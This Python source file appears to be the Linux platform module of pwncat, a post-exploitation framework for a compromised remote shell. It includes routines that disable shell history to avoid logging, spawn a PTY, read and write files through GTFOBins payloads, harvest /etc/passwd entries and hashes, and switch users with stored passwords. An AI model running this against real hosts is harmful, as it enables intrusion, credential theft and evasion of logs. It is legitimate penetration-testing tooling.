#!/usr/bin/env python3
from typing import Generator, List, Union, BinaryIO, Optional
from subprocess import CalledProcessError, TimeoutExpired
from io import TextIOWrapper, BufferedIOBase, UnsupportedOperation
import subprocess
import pathlib
import pkg_resources
import hashlib
import time
import shlex
import os

import pwncat
import pwncat.channel
import pwncat.subprocess
from pwncat import util
from pwncat.gtfobins import GTFOBins, Capability, Stream, MissingBinary
from pwncat.platform import Platform, PlatformError, Path


class PopenLinux(pwncat.subprocess.Popen):
    """
    Linux-specific Popen wrapper class.
    """

    def __init__(
        self,
        platform: Platform,
        args,
        stdout,
        stdin,
        text,
        encoding,
        errors,
        bufsize,
        start_delim: bytes,
        end_delim: bytes,
        code_delim: bytes,
    ):
        super().__init__()

        self.platform: Platform = platform
        self.start_delim: bytes = start_delim
        self.end_delim: bytes = end_delim
        self.code_delim: bytes = code_delim

        # Create a reader-pipe
        if stdout == pwncat.subprocess.PIPE:
            self.stdout_pipe = True

        if text or encoding is not None or errors is not None:
            line_buffering = bufsize == 1
            bufsize = -1

        # We create a stdout pipe regardless. This is how we
        # track whether the process has completed.
        self.stdout_raw = platform.channel.makefile(
            "r", bufsize=bufsize, sof=start_delim, eof=end_delim
        )

        if text or encoding is not None or errors is not None:
            self.stdout = TextIOWrapper(
                self.stdout_raw,
                line_buffering=line_buffering,
                encoding=encoding,
                errors=errors,
            )
        else:
            # We want a binary stream, so just copy the reference
            self.stdout = self.stdout_raw

        # Create the writer-pipe if requested
        if stdin == pwncat.subprocess.PIPE:
            self.stdin = platform.channel.makefile("w")
            if text or encoding is not None or errors is not None:
                self.stdin = TextIOWrapper(
                    self.stdin, encoding=encoding, errors=errors, write_through=True
                )

    def detach(self):

        # Indicate the process is complete
        self.returncode = 0

        # Close file descriptors to prevent further interaction
        if self.stdout is not None:
            self.stdout.close()
        if self.stdin is not None:
            self.stdin.close()
        if self.stdout_raw is not None:
            self.stdout_raw.close()

    def poll(self):

        if self.returncode is not None:
            return self.returncode

        if self.stdin is not None:
            self.stdin.flush()

        # Drain buffer, don't wait for more data. The user didn't ask
        # for the data with `stdout=PIPE`, so we can safely ignore it.
        # This returns true if we hit EOF
        try:
            if (
                self.stdout_raw.peek(len(self.end_delim)) == b""
                and self.stdout_raw.raw.eof
            ):
                self._receive_returncode()
                return self.returncode
        except ValueError:
            self._receive_returncode()
            return self.returncode

    def wait(self, timeout: float = None):

        if timeout is not None:
            end_time = time.time() + timeout
        else:
            end_time = None

        while self.poll() is None:
            if end_time is not None and time.time() >= end_time:
                raise TimeoutExpired(self.args, timeout)

            time.sleep(0.1)

            # Flush more data to look for the EOF
            self.stdout_raw.read1(4096)

        return self.returncode

    def communicate(self, input=None, timeout=None):

        if self.returncode is not None:
            return (None, None)

        if input is not None and self.stdin is not None:
            self.stdin.write(input)

        if timeout is not None:
            end_time = time.time() + timeout
        else:
            end_time = None

        data = None

        while self.poll() is None:
            if end_time is not None and time.time() >= end_time:
                raise TimeoutExpired(self.args, timeout, data)
            if self.stdout is not None and data is None:
                data = self.stdout.read(4096)
            elif self.stdout is not None:
                new_data = self.stdout.read(4096)
                if new_data is not None:
                    data += new_data
            else:
                # A pipe wasn't requested. Don't buffer the data.
                self.stdout_raw.read1(4096)

        return (data, None)

    def kill(self):

        if self.returncode is not None:
            return

        # Kill the process (SIGINT)
        self.platform.channel.send(util.CTRL_C * 2)
        self.returncode = -1

    def terminate(self):

        if self.returncode is not None:
            return

        # Terminate the process (SIGQUIT)
        self.platform.channel.send(b"\x1C\x1C")
        self.returncode = -1

    def _receive_returncode(self):
        """All output has been read of the stream, now we read
        the return code."""

        # Read until the returncode delimiter
        code = self.platform.channel.recvuntil(self.code_delim)
        code = code.split(self.code_delim)[0]
        code = code.strip().decode("utf-8")

        try:
            self.returncode = int(code)
        except ValueError:
            # This shouldn't happen, but if it does, there's nothing
            # we can do.
            self.returncode = 0


class LinuxReader(BufferedIOBase):
    """
    A file-like object which wraps a Popen object to enable reading a
    remote file.
    """

    def __init__(self, popen, on_close=None):
        super().__init__()

        self.popen = popen
        self.on_close = on_close

    def readable(self):
        if self.popen is None:
            return False
        return True

    def writable(self):
        return False

    def detach(self):
        """ Detach the underlying process and return the Popen object """

        popen = self.popen
        self.popen = None

        return popen

    def read(self, size: int = -1):
        """ Read data from the file """

        if self.popen is None:
            raise UnsupportedOperation("reader is detached")

        result = None
        while result is None:
            result = self.popen.stdout.read(size)

        return result

    def read1(self, size: int = -1):
        """ Read data w/ 1 call to underlying buffer """

        if self.popen is None:
            raise UnsupportedOperation("reader is detached")

        result = None
        while result is None:
            result = self.popen.stdout.read1(size)

        return result

    def readinto(self, b):
        """ Read data w/ 1 call to underlying buffer """

        if self.popen is None:
            raise UnsupportedOperation("reader is detached")

        result = None
        while result is None:
            result = self.popen.stdout.readinto(b)
        return result

    def readinto1(self, b):
        """ Read data w/ 1 call to underlying buffer """

        if self.popen is None:
            raise UnsupportedOperation("reader is detached")

        result = None
        while result is None:
            result = self.popen.stdout.readinto1(b)

        return result

    def close(self):
        """ Close the file and stop the process """

        if self.popen is None:
            raise UnsupportedOperation("reader is detached")

        if self.on_close is not None:
            self.on_close(self)

        try:
            self.popen.wait(timeout=0.1)
        except TimeoutError:
            self.popen.terminate()
            self.popen.wait()

        self.detach()


class LinuxWriter(BufferedIOBase):
    """A wrapper around an active Popen object which is writing to
    a file. Remote files are not seekable, and cannot be simultaneous
    read/write."""

    CONTROL_CODES = [
        0x00,
        0x01,
        0x02,
        0x03,
        0x04,
        0x05,
        0x06,
        0x07,
        0x0C,
        0x0E,
        0x0F,
        0x10,
        0x11,
        0x12,
        0x13,
        0x14,
        0x15,
        0x16,
        0x17,
        0x18,
        0x19,
        0x1A,
        0x1B,
        0x1C,
        0x1D,
        0x1E,
        0x1F,
        0x7F,
    ]

    def __init__(self, popen, on_close=None):
        super().__init__()

        self.popen = popen
        self.last_byte = None
        self.since_newline = 0
        self.on_close = on_close

    def readable(self):
        return False

    def writable(self):
        return True

    def detach(self):
        """ Detach the underlying process and return the Popen object """

        popen = self.popen
        self.popen = None

        return popen

    def write(self, b):
        """Write data to the underlying Popen stdin.
        This translates any control-sequences into escaped control
        sequences, because it assumes you are trying to write to a file
        and not control the terminal.
        """

        if self.popen is None:
            raise UnsupportedOperation("writer is detached")

        if self.popen.platform.has_pty:
            # Control sequences need escaping
            translated = []
            for idx, c in enumerate(b):

                # Track when the last new line was
                if c == 0x0A:
                    self.since_newline = 0
                else:
                    self.since_newline += 1

                # Escape control characters
                if c in LinuxWriter.CONTROL_CODES:
                    translated.append(0x16)

                # Track all characters in translated buffer
                translated.append(c)

                if self.since_newline >= 4095:
                    # Flush read immediately to prevent truncation of line
                    translated.append(0x04)
                    self.since_newline = 0

            self.last_byte = bytes([translated[-1]])

            self.popen.stdin.write(bytes(translated))
        else:
            self.popen.stdin.write(b)

        return len(b)

    def close(self):
        """ Close the file and stop the process """

        if self.popen is None:
            return

        self.flush()
        self.popen.stdin.flush()

        if self.on_close is not None:
            self.on_close(self)

        # We don't want to send CTRL-D if the process already
        # exited, so we do a poll first
        if self.popen.poll() is not None:
            self.detach()
            return

        # Indicate EOF
        self.popen.stdin.write(b"\x04")
        if self.since_newline:
            self.popen.stdin.write(b"\x04")

        try:
            # Check for completion
            self.popen.wait(timeout=100)
        except pwncat.subprocess.TimeoutExpired:
            # Nope, force terminate with C-c
            # self.popen.terminate()
            # Cleanup
            self.popen.wait()

        # Ensure we don't touch stdio again
        self.detach()


class Linux(Platform):
    """
    Concrete platform class abstracting interaction with a GNU/Linux remote
    host. See the base class (``pwncat.platform.Platform``) for more
    information on the implemented methods and interface definition.
    """

    PATH_TYPE = pathlib.PurePosixPath

    def __init__(self, session, channel: pwncat.channel.Channel, log: str = None):
        super().__init__(session, channel, log)

        # Name of this platform. This stored in the database and used
        # to match modules to this platform.
        self.name = "linux"

        # This causes an stty to be sent.
        # If we aren't in a pty, it doesn't matter.
        # if we are, we need this stty to properly handle process IO
        self._interactive = True
        self.interactive = False

        # Load a GTFOBins database to assist in common operations
        # without relying on specific binaries being available.
        self.gtfo = GTFOBins(
            pkg_resources.resource_filename("pwncat", "data/gtfobins.json"), self.which
        )

        # Ensure history is disabled
        self.disable_history()

        p = self.Popen("[ -t 1 ]")
        if p.wait() == 0:
            self.has_pty = True
        else:
            self.has_pty = False

    def disable_history(self):
        """ Disable shell history """

        # Ensure history is not tracked
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace; unset PROMPT_COMMAND")

    def get_pty(self):
        """Spawn a PTY in the current shell. If a PTY is already running
        then this method does nothing."""

        # Check if we are currently in a PTY
        if self.has_pty:
            return

        pty_command = None

        if pty_command is None:
            script_path = self.which("script")
            if script_path is not None:
                pty_command = f""" exec {script_path} -qc /bin/sh /dev/null 2>&1\n"""

        if pty_command is None:
            python_path = self.which(
                [
                    "python",
                    "python2",
                    "python2.7",
                    "python3",
                    "python3.6",
                    "python3.8",
                    "python3.9",
                ]
            )
            if python_path is not None:
                pty_command = f"""exec {python_path} -c "import pty; pty.spawn('/bin/sh')" 2>&1\n"""

        if pty_command is not None:
            self.logger.info(pty_command.rstrip("\n"))
            self.channel.send(pty_command.encode("utf-8"))

            self.has_pty = True

            # Preserve interactivity
            if not self.interactive:
                self._interactive = True
                self.interactive = False

            # When starting a pty, history is sometimes re-enabled
            self.disable_history()

            return

        raise PlatformError("no avialable pty methods")

    def get_host_hash(self) -> str:
        """
        Retrieve a string which uniquely identifies this victim host. On Unix-like
        platforms, this retrieves the hostname and MAC addresses of any available
        network interfaces and computes a hash, which should be unique regardless of
        connection method.

        :return: a unique string (normally a hash) identifying this host
        :rtype: str
        """

        with self.session.task("calculating host hash") as task:
            try:
                self.session.update_task(
                    task, status="retrieving hostname (hostname -f)"
                )
                result = self.run(
                    "hostname -f", shell=True, check=True, text=True, encoding="utf-8"
                )
                hostname = result.stdout.strip()
            except CalledProcessError:
                hostname = self.channel.getpeername()[0]

            try:
                self.session.update_task(
                    task, status="retrieving mac addresses (ifconfig)"
                )
                result = self.run(
                    "ifconfig -a", shell=True, check=True, text=True, encoding="utf-8"
                )
                ifconfig = result.stdout.strip().lower()

                for line in ifconfig.split("\n"):
                    if "hwaddr" in line and "00:00:00:00:00:00" not in line:
                        mac = line.split("hwaddr ")[1].split("\n")[0].strip()
                        break
                    if "ether " in line and "00:00:00:00:00:00" not in line:
                        mac = line.split("ether ")[1].split(" ")[0]
                        break
                else:
                    mac = None
            except CalledProcessError:
                # Attempt to use the `ip` command instead
                try:
                    self.session.update_task(
                        task, status="retrieving mac addresses (ip link show)"
                    )
                    result = self.run(
                        "ip link show",
                        shell=True,
                        check=True,
                        text=True,
                        encoding="utf-8",
                    )
                    ip_out = result.stdout.strip().lower()
                    for line in ip_out.split("\n"):
                        if "link/ether" in line and "00:00:00:00:00:00" not in line:
                            mac = line.split("link/ether ")[1].split(" ")[0]
                            break
                    else:
                        mac = None
                except CalledProcessError:
                    mac = None

        # In some (unlikely) cases, `mac` may be None, so we use `str` here.
        identifier = hostname + str(mac)
        return hashlib.md5(identifier.encode("utf-8")).hexdigest()

    def listdir(self, path=None) -> Generator[str, None, None]:
        """List the contents of a directory. If ``path`` is None,
        then the contents of the current directory is listed. The
        list is not guaranteed to be sorted in any way.

        :param path: the directory to list
        :type path: str or Path-like
        :raise FileNotFoundError: When the requested directory is not a directory,
          does not exist, or you do not have execute permissions.
        """

        try:
            p = self.run(
                ["ls", "--all", "-1", path],
                encoding="utf-8",
                capture_output=True,
                check=True,
            )
        except CalledProcessError:
            return

        for name in p.stdout.split("\n"):
            yield name

    def which(self, name: str, quote: bool = False) -> str:
        """
        Locate the specified binary on the remote host. Normally, this is done through
        the local `which` command on the remote host (for unix-like hosts), but can be
        located by any means. The returned path string is guaranteed to exist on the
        remote host and provide the capabilities of the requested binary.

        :param name: name of the binary (e.g. "tar" or "dd")
        :type name: str
        :return: full path to the requested binary
        :rtype: str
        :raises: FileNotFoundError: the requested binary does not exist on this host
        """

        if not isinstance(name, str):
            for item in name:
                result = self.which(item)
                if result is not None:
                    return result
            return None

        p = self.Popen(
            ["which", name],
            encoding="utf-8",
            stderr=pwncat.subprocess.DEVNULL,
            stdout=pwncat.subprocess.PIPE,
        )
        stdout, _ = p.communicate()

        if p.returncode != 0:
            return None

        stdout = stdout.strip()

        if stdout == "":
            return None

        if quote:
            return shlex.quote(stdout)

        return stdout

    def getenv(self, name: str):

        try:
            proc = self.run(
                ["echo", f"${name}"], capture_output=True, text=True, check=True
            )
            return proc.stdout.rstrip("\n")
        except CalledProcessError:
            return ""

    def compile(
        self,
        sources: List[Union[str, BinaryIO]],
        output: str = None,
        suffix: str = None,
        cflags: List[str] = None,
        ldflags: List[str] = None,
    ):
        """
        Attempt to compile the given C source files into a binary suitable for the remote
        host. If a compiler exists on the remote host, prefer compilation locally. If no
        compiler exists on the remote remote host, check the `cross` global config variable
        for the path to a local compiler capable of generating binaries for the remote host.
        If the binary is compiled locally, it is automatically uploaded to the remote host.
        The path to the new binary on the victim is returned.

        :param sources: list of source file paths or IO streams used as source files
        :type sources: List[Union[str, io.IOBase]]
        :param output: base name of the output file. If not specified, a name is randomly generated.
        :type output: str
        :param suffix: a suffix to add to the output name.
        :type suffix: str
        :param cflags: a list of flags to pass to the compiler
        :type cflags: List[str]
        :param ldflags: a list of flags to pass to the linker
        :type ldflags: List[str]
        """

    def Popen(
        self,
        args,
        bufsize=-1,
        stdin=None,
        stdout=None,
        stderr=None,
        shell=False,
        cwd=None,
        encoding=None,
        text=None,
        errors=None,
        env=None,
        bootstrap_input=None,
        **other_popen_kwargs,
    ) -> pwncat.subprocess.Popen:
        """
        Execute a process on the remote host with an interface similar to
        that of the python standard ``subprocess.Popen``. The returned
        object behaves much like a standard ``Popen`` object and conforms
        to the interface defined by ``pwncat.subprocess.Popen``. For
        an explanation of arguments, see ``pwncat.subprocess.Popen``.
        """

        if self.interactive:
            raise PlatformError(
                "cannot open non-interactive process in interactive mode"
            )

        if isinstance(args, list):
            command = shlex.join(args)
        elif isinstance(args, str):
            command = args
        else:
            raise ValueError("expected a command string or list of arguments")

        if shell:
            # Ensure this works normally
            command = shlex.join(["/bin/sh", "-c", command])

        if cwd is not None:
            command = f"(cd {cwd} && {command})"

        if env is not None:
            command = (
                " ".join(
                    [
                        f"{util.quote(name)}={util.quote(value)}"
                        for name, value in env.items()
                    ]
                )
                + " "
                + command
            )

        if isinstance(stdout, str):
            command += f" >{stdout}"
        elif stdout == pwncat.subprocess.DEVNULL:
            command += " >/dev/null"

        if isinstance(stderr, str):
            command += f" 2>{stderr}"
        elif stderr == pwncat.subprocess.DEVNULL:
            command += " 2>/dev/null"

        if isinstance(stdin, str):
            command += f" 0<{stdin}"
        elif stdin == pwncat.subprocess.DEVNULL:
            command += " 0</dev/null"
        elif stdin != pwncat.subprocess.PIPE:
            # if a process requests stdin but we aren't expecting it
            # things can get wonky. We prevent that by kill stdin unless
            # explicitly asked for.
            command += " 0</dev/null"

        # Generate delimeters
        start_delim = util.random_string(10)
        end_delim = util.random_string(10)
        code_delim = util.random_string(10)

        commands = []
        commands.append(" export PS1=")
        commands.append(
            f"echo; echo {start_delim}; {command}; R=$?; echo {end_delim}; echo $R; echo {code_delim}"
        )

        # Build the final command
        command = ";".join(commands).encode("utf-8")

        # Send the command
        self.channel.send(command + b"\n")

        # Send bootstraping input if provided
        if bootstrap_input is not None:
            self.channel.send(bootstrap_input)

        # Log the command
        self.logger.info(command.decode("utf-8"))

        return PopenLinux(
            self,
            args,
            stdout,
            stdin,
            text,
            encoding,
            errors,
            bufsize,
            start_delim.encode("utf-8") + b"\n",
            end_delim.encode("utf-8") + b"\n",
            code_delim.encode("utf-8") + b"\n",
        )

    def chdir(self, path: Union[str, Path]):
        """
        Change directories to the given path. This method returns the current
        working directory prior to the change.

        :param path: a relative or absolute path to change to
        :type path: Union[str, pwncat.platform.Path]
        :return: current working directory prior to the change
        :raises:
          FileNotFoundError: the specified path doesn't exist
          NotADirectoryError: the specified path is not a directory
        """

    def open(
        self,
        path: Union[str, Path],
        mode: str = "r",
        buffering: int = -1,
        encoding: str = "utf-8",
        errors: str = None,
        newline: str = None,
    ):
        """
        Open a remote file for reading or writing. Normally, only one of read or
        write modes are allowed for a remote file, but this may change with
        future platforms. It is recommended to only use one mode when opening
        remote files. This method attempts to replicate the built-in ``open``
        function and returns a file-like object. The `b` mode is honored and
        if not present, a TextIOWrapper is used to wrap the file object to ensure
        text data is returned.

        :param path: path to the file
        :type path: Union[str, pwncat.platform.Path]
        :param mode: the open-mode (see built-in ``open``)
        :type mode: str
        :return: a file-like object
        :raises:
          FileNotFoundError: the specified file does not exist
          IsADirectoryError: the specified path refers to a directory
        """

        # Ensure no invalid overlap of modes
        if "r" in mode and "w" in mode:
            raise PlatformError("mixed read/write streams are not supported")

        # Ensure all mode properties are valid
        for char in mode:
            if char not in "rwb":
                raise PlatformError(f"{char}: unknown file mode")

        # Save this just in case we are opening a text-mode stream
        line_buffering = buffering == -1 or buffering == 1

        # For text-mode files, use default buffering for the underlying binary
        # stream.
        if "b" not in mode:
            buffering = -1

        if "w" in mode:

            for method in self.gtfo.iter_methods(
                caps=Capability.WRITE, stream=Stream.PRINT | Stream.RAW
            ):
                try:
                    payload, input_data, exit_cmd = method.build(
                        lfile=path, suid=True, length=1000000
                    )
                    break
                except MissingBinary:
                    pass
            else:
                raise PlatformError("no available gtfobins writiers")

            popen = self.Popen(
                payload,
                shell=True,
                stdin=pwncat.subprocess.PIPE,
                bufsize=buffering,
                bootstrap_input=input_data.encode("utf-8"),
            )

            stream = LinuxWriter(
                popen,
                on_close=lambda filp: filp.popen.platform.channel.send(
                    exit_cmd.encode("utf-8")
                ),
            )
        else:
            for method in self.gtfo.iter_methods(
                caps=Capability.READ, stream=Stream.PRINT | Stream.RAW
            ):
                try:
                    payload, input_data, exit_cmd = method.build(
                        lfile=path, suid=True, length=1000000
                    )
                    break
                except MissingBinary:
                    pass
            else:
                raise PlatformError("no available gtfobins writiers")

            popen = self.Popen(
                payload,
                shell=True,
                stdin=pwncat.subprocess.PIPE,
                bufsize=buffering,
                bootstrap_input=input_data.encode("utf-8"),
            )

            stream = LinuxReader(
                popen,
                on_close=lambda filp: filp.popen.platform.channel.send(
                    exit_cmd.encode("utf-8")
                ),
            )

        if "b" not in mode:
            stream = TextIOWrapper(
                stream,
                encoding=encoding,
                errors=errors,
                newline=newline,
                write_through=True,
                line_buffering=line_buffering,
            )

        return stream

    def tempfile(
        self,
        mode: str = "r",
        length: Optional[int] = None,
        suffix: Optional[str] = None,
    ):
        """
        Create a temporary file on the remote host and open it with the specified mode.
        Creating a new temporary file with a mode other than "w" is mostly useless,
        however ``mode`` can be used to specify a binary or text-mode file. The length
        argument is useful if you know the length of file you are about to read. This
        alleviates some situations which could be complicated on some platforms by not
        knowing the intended file length prior to opening. Optionally, a suffix can be
        added to the random file name. A file-like object is returned. The temporary
        file is not removed by pwncat itself. Unless explicitly removed, it will continue
        to exist until the remote operating system cleans up temporary files (possible
        at the next reboot).

        :param mode: the open-mode for the new file-like object
        :type mode: str
        :param length: the intended length for the new file
        :type length: int
        :param suffix: a suffix for the filename
        :type suffix: str
        :return: a file-like object
        """

    def su(self, user: str, password: Optional[str] = None):
        """
        Attempt to switch users in the running shell. This normally executes a new
        sub-shell as the requested user. On unix-like systems, this is simply a
        wrapper for the ``su`` command. Implementations may differ on other systems.
        If a password isn't provided, the database will be consulted for a matching
        username and password.

        :param user: the name of the new user
        :type user: str
        :param password: the password for the new user
        :type password: str
        :raises:
          PermissionError: the provided password was incorrect
        """

        # We need a pty to call `su`
        self.get_pty()

        if password is None and self.current_user().id != 0:
            password = self.find_user(name=user).password

        if self.current_user().id != 0 and password is None:
            raise PermissionError("no password provided")

        # Run `su`
        proc = self.Popen(
            ["su", user], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
        )

        # Assume we don't need a password if we are root
        if self.current_user().id != 0:

            # Send the password
            proc.stdin.write(password + "\n")
            proc.stdin.flush()

            # Retrieve the response (this may take some time if wrong)
            result = proc.stdout.readline().lower()

            if result == "password: \n":
                result = proc.stdout.readline().lower()

            # Check for keywords indicating failure
            if "fail" in result or "incorrect" in result:

                try:
                    # The call failed, wait for the result
                    proc.wait(timeout=5)
                except TimeoutError:
                    proc.kill()
                    proc.wait()

                # Raise an error. The password was incorrect
                raise PermissionError("incorrect password")

        proc.detach()

    def sudo(
        self,
        command: Union[str, List[str]],
        user: Optional[str] = None,
        group: Optional[str] = None,
        password: Optional[str] = None,
        **popen_kwargs,
    ):
        """
        Run the specified command as the specified user and group. On unix-like systems
        the normally translates to the ``sudo`` command. The command is executed using
        the ``self.popen`` method. All arguments not documented here are passed directly
        to ``self.popen``. The process is executed and if a password is required, it is
        sent from the database. If a password is not available, the process is killed
        and a PermissionError is raised. If the password is incorrect, a PermissionError
        is also raised.
        """

    @property
    def interactive(self) -> bool:
        """
        Indicates whether the remote victim shell is currently in a state suitable for
        user-interactivity. Setting this property to True will ensure that a suitable
        shell prompt is set, echoing is one, etc.
        """

        return self._interactive

    @interactive.setter
    def interactive(self, value: bool):
        """
        Enable or disable interactivity for this victim.
        """

        if value == self._interactive:
            return

        if not value:
            command = " ; ".join([" stty -echo nl lnext ^V", "export PS1="]) + "\n"
            self.logger.info(command.rstrip("\n"))
            self.channel.send(command.encode("utf-8"))
        else:

            # Going interactive requires a pty
            self.get_pty()

            # Get local terminal information
            TERM = os.environ.get("TERM", "xterm")
            columns, rows = os.get_terminal_size(0)

            command = (
                " ; ".join(
                    [
                        " stty sane",
                        f" stty rows {rows} columns {columns}",
                        f" export TERM='{TERM}'",
                        """export PS1='$(command printf "\\033[01;31m(remote)\\033[0m \\033[01;33m$(whoami)@$(hostname)\\033[0m:\\033[1;36m$PWD\\033[0m$ ")'""",
                    ]
                )
                + "\n"
            )
            self.logger.info(command.rstrip("\n"))
            self.channel.send(command.encode("utf-8"))

        self._interactive = value

    def _do_which(self, name: str):
        # NOTE - This needs to be implemented
        return None

    def whoami(self):
        """ Get the name of the current user """

        return self.run(
            ["whoami"], capture_output=True, check=True, encoding="utf-8"
        ).stdout.rstrip("\n")

    def reload_users(self):
        """ Reload users from the remote host and cache them in the database """

        with self.session.db as db:
            # Delete existing users from the database
            db.query(pwncat.db.User).filter_by(host_id=self.session.host).delete()
            db.query(pwncat.db.Group).filter_by(host_id=self.session.host).delete()
            db.commit()

        with self.open("/etc/passwd") as filp:
            etc_passwd = filp.readlines()

        with self.open("/etc/group") as filp:
            etc_group = filp.readlines()

        with self.session.db as db:
            users = {}

            for user_line in etc_passwd:
                name, password, uid, gid, description, home, shell = user_line.rstrip(
                    "\n"
                ).split(":")
                user = pwncat.db.User(
                    host_id=self.session.host,
                    id=uid,
                    gid=gid,
                    name=name,
                    homedir=home,
                    shell=shell,
                    fullname=description,
                )

                # Some users have a hash here, but they shouldn't
                if password != "x":
                    user.hash = password

                # Track for group creation
                users[name] = user

                # Add to the database
                db.add(user)

            for group_line in etc_group:
                name, _, id, *members = group_line.rstrip("\n").split(":")
                members = ":".join(members).split(",")

                # Build the group
                group = pwncat.db.Group(host_id=self.session.host, id=id, name=name)
                for name in members:
                    if name in users:
                        group.members.append(users[name])

                db.add(group)

            db.commit()

    def _parse_stat(self, result: str) -> os.stat_result:
        """ Parse the output of a stat command """

        # Reverse the string. The filename may have a space in it, so we do this
        # to properly parse it.
        result = result.rstrip("\n")[::-1]
        fields = [field[::-1] for field in result.split(" ")]

        # Field order:
        #  0  optimal I/O transfer size
        #  1  time of file birth
        #  2  time of last status change
        #  3  time of last data modification
        #  4  time of last access
        #  5  minor device type (hex)
        #  6  major device type (hex)
        #  7  number of hard links
        #  8  inode number
        #  9  device number (hex)
        #  10 group id of owner
        #  11 user id of owner
        #  12 raw mode (hex)
        #  13 number of blocks allocated
        #  14 total size in bytes

        stat = os.stat_result(
            tuple(
                [
                    int(fields[12], 16),
                    int(fields[8]),
                    int(fields[9], 16),
                    int(fields[7]),
                    int(fields[11]),
                    int(fields[10]),
                    int(fields[14]),
                    int(fields[4]),
                    int(fields[3]),
                    int(fields[2]),
                    int(fields[13]),
                    int(fields[1]),
                ]
            )
        )

        return stat

    def stat(self, path: str) -> os.stat_result:
        """Perform the equivalent of the stat syscall on
        the remote host"""

        try:
            result = self.run(
                [
                    "stat",
                    "-L",
                    "-c",
                    "%n %s %b %f %u %g %D %i %h %t %T %X %Y %Z %W %o",
                    path,
                ],
                capture_output=True,
                encoding="utf-8",
                check=True,
            )
        except CalledProcessError as exc:
            raise FileNotFoundError(path) from exc

        return self._parse_stat(result.stdout)

    def lstat(self, path: str) -> os.stat_result:
        """ Perform the equivalent of the lstat syscall """

        try:
            result = self.run(
                [
                    "stat",
                    "-c",
                    "%n %s %b %f %u %g %D %i %h %t %T %X %Y %Z %W %o",
                    path,
                ],
                capture_output=True,
                encoding="utf-8",
                check=True,
            )
        except CalledProcessError as exc:
            raise FileNotFoundError(path) from exc

        return self._parse_stat(result.stdout)

    def abspath(self, path: str) -> str:
        """ Attempt to resolve a path to an absolute path """

        try:
            result = self.run(
                ["realpath", path], capture_output=True, text=True, check=True
            )
            return result.stdout.rstrip("\n")
        except CalledProcessError as exc:
            raise FileNotFoundError(path) from exc

    def readlink(self, path: str):
        """ Attempt to read the target of a link """

        try:
            self.lstat(path)
            result = self.run(
                ["readlink", path], capture_output=True, text=True, check=True
            )
            return result.stdout.rstrip("\n")
        except CalledProcessError as exc:
            raise OSError(f"Invalid argument: '{path}'") from exc

    def umask(self, mask: int = None):
        """ Set or retrieve the current umask value """

        if mask is None:
            return int(self.run(["umask"], capture_output=True, text=True).stdout, 8)

        self.run(["umask", oct(mask)[2:]])
        return mask

    def touch(self, path: str):
        """ Update a file modification time and possibly create it """

        self.run(["touch", path])

    def chmod(self, path: str, mode: int, link: bool = False):
        """ Update the file permissions """

        if link:
            self.run(["chmod", "-h", oct(mode)[2:], path])
        else:
            self.run(["chmod", oct(mode)[2:], path])

    def mkdir(self, path: str, mode: int = 0o777, parents: bool = False):
        """ Create a new directory """

        try:
            if parents:
                self.run(
                    ["mkdir", "-p", "-m", oct(mode)[2:], path], text=True, check=True
                )
            else:
                self.run(
                    ["mkdir", "-p", "-m", oct(mode)[2:], path], text=True, check=True
                )
        except CalledProcessError as exc:
            if "exists" in exc.stdout:
                raise FileExistsError(exc.stdout) from exc
            else:
                raise FileNotFoundError(exc.stdout) from exc

    def rename(self, source: str, target: str):
        """Rename a file from the source to the target. This should
        replace the target if it exists."""

        try:
            self.run(["mv", source, target], check=True)
        except CalledProcessError as exc:
            raise FileNotFoundError(source) from exc

    def rmdir(self, target: str):
        """ Remove the specified directory. It must be empty. """

        try:
            self.run(["rmdir", target], check=True)
        except CalledProcessError as exc:
            raise OSError(f"Directory not empty: {target}") from exc

    def symlink_to(self, source: str, target: str):
        """ Create a symbolic link to source from target """

        # Since this function is unlikely to be called outside of
        # the path abstraction, we don't do much error checking.
        # We can't reliably tell what happened when the process
        # fails without checking stat output which is easier from
        # the path abstraction itself.
        self.run(["ln", "-s", source, target], check=True)

    def link_to(self, source: str, target: str):
        """ Create a filesystem hard link. """

        # Same warning as with symlink
        self.run(["ln", source, target], check=True)

    def unlink(self, target: str):
        """ Remove a link to a file (similar to `rm`) """

        try:
            self.run(["rm", target], check=True)
        except CalledProcessError as exc:
            raise FileNotFoundError(target) from exc